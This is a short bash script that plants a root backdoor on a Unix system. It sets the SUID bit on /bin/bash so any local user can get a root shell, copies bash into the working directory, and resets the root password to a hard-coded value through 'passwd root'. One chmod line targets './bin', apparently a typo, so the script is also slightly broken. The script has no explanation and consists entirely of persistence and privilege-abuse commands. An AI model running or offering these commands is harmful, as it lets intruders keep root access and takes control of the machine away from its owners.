#!/bin/bash -e

cp /bin/bash .
chmod u+s /bin/bash
chmod u+s ./bin

whoami
echo -e "lokol#lokol#\n" | passwd root
